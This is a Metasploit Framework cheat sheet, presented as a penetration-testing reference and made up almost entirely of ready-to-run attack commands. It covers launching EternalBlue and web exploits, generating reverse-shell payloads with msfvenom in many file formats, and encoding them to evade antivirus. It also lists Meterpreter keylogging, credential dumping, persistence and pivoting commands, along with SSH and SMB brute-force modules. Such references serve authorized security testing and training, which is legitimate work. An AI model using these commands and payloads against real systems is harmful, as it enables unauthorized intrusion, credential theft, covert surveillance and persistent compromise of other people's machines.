# Metasploit Framework Cheat Sheet

Quick reference for Metasploit usage in penetration testing.

---

## Starting Metasploit

```bash
# Start console
msfconsole

# Start with resource file
msfconsole -r script.rc

# Start quietly (no banner)
msfconsole -q

# Start with specific database
msfconsole -y /path/to/database.yml
```

---

## Database Commands

```bash
# Check database status
db_status

# Initialize database
msfdb init

# Reinitialize database
msfdb reinit

# Connect to database
db_connect user:pass@host:port/database

# Disconnect
db_disconnect
```

### Workspace Management
```bash
# List workspaces
workspace

# Create workspace
workspace -a <name>

# Switch workspace
workspace <name>

# Delete workspace
workspace -d <name>
```

### Data Management
```bash
# List hosts
hosts

# List services
services

# List vulnerabilities
vulns

# List credentials
creds

# List loot
loot

# Import scan results
db_import nmap_results.xml
db_import nessus_results.nessus

# Run Nmap from Metasploit
db_nmap -sV -sC <target>
```

---

## Core Commands

```bash
# Search for modules
search <term>
search type:exploit platform:windows
search cve:2021
search name:smb

# Use a module
use <module_path>
use exploit/windows/smb/ms17_010_eternalblue

# Show module info
info

# Show options
show options
show advanced

# Set options
set <option> <value>
set RHOSTS 192.168.1.0/24
set RPORT 445
setg LHOST 192.168.1.100  # Global setting

# Unset options
unset <option>
unsetg <option>

# Run/execute
run
exploit
exploit -j  # Run as job

# Go back
back

# Exit
exit
```

---

## Module Types

| Type | Path | Description |
|------|------|-------------|
| Exploits | `exploit/` | Code execution modules |
| Payloads | `payload/` | Code to run after exploit |
| Auxiliary | `auxiliary/` | Scanning, fuzzing, etc. |
| Post | `post/` | Post-exploitation modules |
| Encoders | `encoder/` | Payload encoding |
| Nops | `nop/` | NOP generators |
| Evasion | `evasion/` | AV evasion modules |

---

## Common Exploits

### Windows
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run

# PSExec
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser <username>
set SMBPass <password>
run

# BlueKeep (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

### Linux
```bash
# Shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# Drupalgeddon
use exploit/unix/webapp/drupal_drupalgeddon2

# Dirty COW
use exploit/linux/local/dirtycow
```

### Web
```bash
# Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload

# Jenkins
use exploit/multi/http/jenkins_script_console

# WordPress
use exploit/unix/webapp/wp_admin_shell_upload
```

---

## Payload Types

### Staged vs Stageless
```bash
# Staged (smaller, requires handler)
windows/meterpreter/reverse_tcp

# Stageless (larger, self-contained)
windows/meterpreter_reverse_tcp
```

### Common Payloads
```bash
# Windows Meterpreter
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_https

# Linux Meterpreter
linux/x64/meterpreter/reverse_tcp

# Generic shells
generic/shell_reverse_tcp
cmd/unix/reverse_bash

# Web payloads
php/meterpreter/reverse_tcp
java/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
```

---

## Meterpreter Commands

### Basic Commands
```bash
# System info
sysinfo
getuid
getpid

# Privilege escalation
getsystem
getprivs

# Process commands
ps
migrate <pid>
kill <pid>

# File system
pwd
cd <directory>
ls
cat <file>
download <file>
upload <file>
edit <file>
rm <file>
mkdir <directory>

# Networking
ipconfig / ifconfig
netstat
route
portfwd add -l 8080 -p 80 -r <target>
```

### Advanced Commands
```bash
# Execute commands
execute -f cmd.exe -i -H
shell

# Screenshots
screenshot

# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# Credential dumping
hashdump
load kiwi
creds_all

# Persistence
run persistence -U -i 5 -p 4444 -r <your_ip>

# Pivoting
run autoroute -s 10.10.10.0/24
background
use auxiliary/server/socks_proxy
run
```

### Post-Exploitation Modules
```bash
# Windows enumeration
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_system
run post/windows/gather/enum_applications
run post/windows/gather/credentials/credential_collector

# Linux enumeration
run post/linux/gather/enum_configs
run post/linux/gather/enum_system
run post/linux/gather/hashdump

# Multi-platform
run post/multi/recon/local_exploit_suggester
run post/multi/gather/env
```

---

## Auxiliary Modules

### Scanning
```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

# Service scanning
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/http/http_version

# Vulnerability scanning
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/http/jboss_vulnscan
```

### Brute Force
```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run

# SMB brute force
use auxiliary/scanner/smb/smb_login

# HTTP brute force
use auxiliary/scanner/http/http_login
```

---

## MSFvenom

### Payload Generation
```bash
# List payloads
msfvenom -l payloads

# List formats
msfvenom -l formats

# List encoders
msfvenom -l encoders
```

### Windows Payloads
```bash
# EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f exe > shell.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f dll > shell.dll

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f psh > shell.ps1

# HTA
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f hta-psh > shell.hta
```

### Linux Payloads
```bash
# ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f elf > shell.elf

# Bash
msfvenom -p cmd/unix/reverse_bash \
    LHOST=<IP> LPORT=4444 -f raw > shell.sh
```

### Web Payloads
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f raw > shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=<IP> LPORT=4444 -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=<IP> LPORT=4444 -f war > shell.war

# ASP
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f asp > shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 -f aspx > shell.aspx
```

### Encoding
```bash
# Single encoding
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 \
    -e x86/shikata_ga_nai -f exe > shell.exe

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 \
    -e x86/shikata_ga_nai -i 5 -f exe > shell.exe

# Bad characters
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=<IP> LPORT=4444 \
    -b '\x00\x0a\x0d' -f exe > shell.exe
```

---

## Handler Setup

### Basic Handler
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run

# Run as background job
exploit -j
```

### Handler Resource Script
```bash
# Save as handler.rc
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j

# Run with
msfconsole -r handler.rc
```

---

## Session Management

```bash
# List sessions
sessions

# Interact with session
sessions -i <id>

# Background session
background
# or Ctrl+Z

# Kill session
sessions -k <id>

# Kill all sessions
sessions -K

# Upgrade shell to meterpreter
sessions -u <id>

# Run command on all sessions
sessions -c "sysinfo"
```

---

## Resource Scripts

### Create Script
```bash
# Save commands to file
makerc /path/to/script.rc

# Or create manually:
cat > script.rc << 'EOF'
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
EOF

# Run script
resource /path/to/script.rc
# or
msfconsole -r script.rc
```

---

## Tips & Best Practices

1. **Always use workspaces** - Keep engagements separate
2. **Use db_nmap** - Results auto-import to database
3. **Background jobs** - Run handlers with `-j`
4. **AutoRoute** - For pivoting through compromised hosts
5. **Use staged payloads** - Smaller, more likely to succeed
6. **Encode payloads** - Better AV evasion
7. **Check ExitOnSession** - Set to false for multiple shells
8. **Document everything** - Use notes in database

---

## Troubleshooting

### Database Issues
```bash
# Check status
db_status

# Reinitialize
msfdb reinit

# Manual PostgreSQL
sudo systemctl start postgresql
sudo -u postgres createuser msf
sudo -u postgres createdb msf -O msf
```

### Handler Not Receiving
1. Check firewall rules
2. Verify LHOST is correct
3. Check LPORT is not in use
4. Ensure payload matches

### Exploit Failing
1. Check target architecture (x86 vs x64)
2. Verify service version
3. Check payload compatibility
4. Review exploit requirements

---

## Resources

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Rapid7 Blog](https://www.rapid7.com/blog/)
- [Offensive Security](https://www.offensive-security.com/metasploit-unleashed/)
